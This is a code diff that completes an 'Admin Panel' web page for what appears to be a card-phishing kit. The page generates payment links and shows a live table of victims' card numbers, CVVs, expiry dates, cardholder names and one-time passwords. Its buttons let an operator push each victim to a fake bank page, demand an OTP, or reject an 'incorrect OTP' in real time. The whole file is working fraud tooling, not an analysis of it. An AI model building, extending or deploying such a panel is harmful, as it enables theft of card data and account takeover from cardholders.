@@ -5,11 +5,130 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Admin Panel</title>
   <style>
-    /* Keep all your existing CSS styles */
-    body { background: #000; color: #fff; font-family: Arial, sans-serif; padding: 20px; }
-    h1 { text-align: center; margin-bottom: 20px; }
-    .container { max-width: 1200px; margin: 0 auto; }
-    /* ... rest of your existing styles ... */
+    body {
+      background: #000; 
+      color: #fff;
+      font-family: Arial, sans-serif; 
+      padding: 20px;
+    }
+    h1 { 
+      text-align: center; 
+      margin-bottom: 20px; 
+    }
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .generate-link {
+      background: #222;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      color: #aaa;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 8px;
+      border: 1px solid #444;
+      background: #333;
+      color: #fff;
+      border-radius: 4px;
+    }
+    .payment-link {
+      margin-top: 15px;
+      padding: 10px;
+      background: #333;
+      border-radius: 4px;
+      display: none;
+    }
+    .copy-btn {
+      background: #22c55e;
+      border: none;
+      color: white;
+      padding: 5px 10px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-left: 10px;
+    }
+    table {
+      width: 100%; 
+      border-collapse: collapse;
+      background: #111; 
+      margin-bottom: 20px;
+    }
+    th, td {
+      padding: 10px; 
+      border: 1px solid #333;
+      text-align: left; 
+      font-size: 12px;
+    }
+    th { 
+      background: #222; 
+    }
+    tr:nth-child(even) { 
+      background: #222; 
+    }
+    button {
+      background: #4a90e2; 
+      color: #fff;
+      border: none; 
+      padding: 6px 10px; 
+      margin-right: 4px;
+      cursor: pointer; 
+      border-radius: 4px; 
+      font-size: 12px;
+    }
+    button:hover {
+      background: #357ABD;
+    }
+    button:disabled {
+      background: #666;
+      cursor: not-allowed;
+    }
+    .refresh-btn {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      padding: 10px 20px;
+      background: #22c55e;
+      font-size: 14px;
+    }
+    .status-badge {
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-size: 11px;
+      font-weight: bold;
+    }
+    .status-processing { background: #f59e0b; color: #000; }
+    .status-otp { background: #3b82f6; color: #fff; }
+    .status-success { background: #22c55e; color: #fff; }
+    .status-fail { background: #ef4444; color: #fff; }
+    .otp-received {
+      background-color: #10B981;
+      color: white;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 12px;
+    }
+    .show-otp-btn {
+      background: #22c55e;
+    }
+    .show-otp-btn:disabled {
+      background: #666;
+    }
+    .wrong-otp-btn {
+      background: #ef4444;
+    }
+    .wrong-otp-btn:hover {
+      background: #dc2626;
+    }
     .show-bankpage-btn {
       background: #8b5cf6;
       color: white;
@@ -18,8 +137,11 @@
     }
     .show-bankpage-btn:hover { background: #7c3aed; }
     .show-bankpage-btn:disabled { background: #666; }
+    .hide-bankpage-btn {
+      background: #ef4444;
+      margin-left: 5px;
+    }
   </style>
-  <!-- Add Socket.io client -->
   <script src="/socket.io/socket.io.js"></script>
 </head>
 <body>
@@ -29,25 +151,51 @@
     <div class="generate-link">
       <h2>Generate Payment Link</h2>
       <form id="generateLinkForm">
-        <!-- Keep your existing form elements -->
+        <div class="form-group">
+          <label>Amount (INR)</label>
+          <input type="number" id="amount" required min="1" step="1">
+        </div>
+        <div class="form-group">
+          <label>Description</label>
+          <textarea id="description" rows="2" required></textarea>
+        </div>
+        <button type="submit">Generate Link</button>
       </form>
       <div id="paymentLinkContainer" class="payment-link">
-        <!-- Keep your existing payment link display -->
+        <span>Payment Link: </span>
+        <span id="paymentLink"></span>
+        <button class="copy-btn" onclick="copyPaymentLink()">Copy</button>
       </div>
     </div>
 
     <h2>Transactions</h2>
     <table id="transactionsTable">
-      <!-- Keep your existing table structure -->
+      <thead>
+        <tr>
+          <th>Invoice ID</th>
+          <th>Email</th>
+          <th>Amount</th>
+          <th>Currency</th>
+          <th>Card Number</th>
+          <th>CVV</th>
+          <th>Expiry</th>
+          <th>Cardholder</th>
+          <th>OTP</th>
+          <th>Status</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody>
+        <!-- Transaction rows injected here -->
+      </tbody>
     </table>
   </div>
 
   <script>
     const socket = io();
-    let transactions = new Map();
     let adminToken = localStorage.getItem('adminToken');
-
-    // Initialize Socket.io
+    
+    // Socket.io Listeners
     socket.on('showBankPage', () => loadTransactions());
     socket.on('hideBankPage', () => loadTransactions());
 
@@ -73,12 +221,67 @@
           document.getElementById('paymentLinkContainer').style.display = 'block';
         }
       } catch (error) {
-        console.error('Error generating payment link:', error);
         alert('Failed to generate payment link');
       }
     });
 
-    // Bank Page Functions
+    function copyPaymentLink() {
+      const link = document.getElementById('paymentLink').textContent;
+      navigator.clipboard.writeText(link);
+      alert('Copied to clipboard!');
+    }
+
+    async function showOTP(id) {
+      try {
+        const response = await fetch("/api/showOTP", {
+          method: "POST",
+          headers: { 
+            "Content-Type": "application/json",
+            "Authorization": `Bearer ${adminToken}`
+          },
+          body: JSON.stringify({ invoiceId: id })
+        });
+        if (!response.ok) throw new Error();
+        loadTransactions();
+      } catch (error) {
+        alert('Failed to show OTP');
+      }
+    }
+
+    async function markWrongOTP(id) {
+      try {
+        const response = await fetch("/api/wrongOTP", {
+          method: "POST",
+          headers: { 
+            "Content-Type": "application/json",
+            "Authorization": `Bearer ${adminToken}`
+          },
+          body: JSON.stringify({ invoiceId: id })
+        });
+        if (!response.ok) throw new Error();
+        loadTransactions();
+      } catch (error) {
+        alert('Failed to mark OTP');
+      }
+    }
+
+    async function updateStatus(id, status) {
+      try {
+        const response = await fetch("/api/updateRedirectStatus", {
+          method: "POST",
+          headers: { 
+            "Content-Type": "application/json",
+            "Authorization": `Bearer ${adminToken}`
+          },
+          body: JSON.stringify({ invoiceId: id, redirectStatus: status })
+        });
+        if (!response.ok) throw new Error();
+        loadTransactions();
+      } catch (error) {
+        alert('Failed to update status');
+      }
+    }
+
     async function showBankPage(id) {
       try {
         const response = await fetch("/api/showBankPage", {
@@ -89,16 +292,11 @@
           },
           body: JSON.stringify({ invoiceId: id })
         });
-        
-        if (!response.ok) throw new Error('Failed to show bank page');
-        
-        // Open bank page in new tab
+        if (!response.ok) throw new Error();
         window.open(`/bankpage.html?invoiceId=${id}`, '_blank');
         loadTransactions();
-        
       } catch (error) {
-        console.error('Error showing bank page:', error);
-        alert('Failed to show bank page. Please try again.');
+        alert('Failed to show bank page');
       }
     }
 
@@ -112,17 +310,13 @@
           },
           body: JSON.stringify({ invoiceId: id })
         });
-        
-        if (!response.ok) throw new Error('Failed to hide bank page');
+        if (!response.ok) throw new Error();
         loadTransactions();
-        
       } catch (error) {
-        console.error('Error hiding bank page:', error);
-        alert('Failed to hide bank page. Please try again.');
+        alert('Failed to hide bank page');
       }
     }
 
-    // Transaction Loading
     async function loadTransactions() {
       try {
         const response = await fetch("/api/transactions", {
@@ -139,7 +333,7 @@
           row.innerHTML = `
             <td>${tx.id}</td>
             <td>${tx.email}</td>
-            <td>${tx.amount}</td>
+            <td>₹${tx.amount}</td>
             <td>${tx.currency}</td>
             <td>${tx.cardNumber}</td>
             <td>${tx.cvv}</td>
@@ -152,20 +346,20 @@
                    Incorrect OTP
                  </button>` : 
                 tx.otpShown ?
-                  '<span class="status-badge status-otp">Waiting for OTP</span>' :
+                  '<span class="status-badge status-otp">OTP Pending</span>' :
                   `<div style="display: flex; gap: 6px;">
                     <button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                       Show OTP
                     </button>
                     <button class="show-bankpage-btn" onclick="showBankPage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
-                      Show Bank Page
+                      Show Bank
                     </button>
                   </div>`
               }
             </td>
             <td>
               <span class="status-badge status-${tx.status || 'processing'}">
-                ${tx.status === 'otp_received' ? 'OTP Received' : tx.status === 'otp_pending' ? 'OTP Pending' : tx.status || 'Processing'}
+                ${tx.status?.toUpperCase() || 'Processing'}
               </span>
             </td>
             <td>
@@ -176,9 +370,9 @@
                 <button onclick="updateStatus('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}>
                   Fail
                 </button>
-                ${tx.bankPageActive ? 
-                  `<button class="wrong-otp-btn" onclick="hideBankPage('${tx.id}')">
-                    Hide Bank Page
+                ${tx.bankPageActive ? `
+                  <button class="hide-bankpage-btn" onclick="hideBankPage('${tx.id}')">
+                    Hide Bank
                   </button>` : ''}
               ` : ''}
             </td>
@@ -192,10 +386,7 @@
 
     // Initial load
     loadTransactions();
-    setInterval(loadTransactions, 2000);
-
-    // Add other existing functions (copyPaymentLink, showOTP, markWrongOTP, updateStatus) here
-    // ... keep your existing functions unchanged ...
+    setInterval(loadTransactions, 3000);
 
   </script>
 </body>
